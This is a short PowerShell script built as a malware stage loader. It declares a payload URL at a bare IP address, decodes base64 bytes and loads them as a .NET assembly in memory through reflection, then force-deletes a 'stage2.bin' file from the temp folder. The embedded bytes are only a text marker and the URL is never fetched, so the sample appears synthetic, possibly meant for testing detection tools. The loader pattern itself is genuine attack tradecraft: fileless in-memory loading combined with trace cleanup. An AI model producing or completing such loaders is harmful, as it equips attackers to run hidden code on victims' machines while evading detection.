
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://198.51.100.214/payload.bin',
    [int]$TimeoutSec = 101
)
$ErrorActionPreference = "Stop"

try {
    $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo4MTQzNDNsbHBu')
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($PayloadBytes)
    if ($null -ne $StageResult) {
        Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Write-Output "stage 16 initialized"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
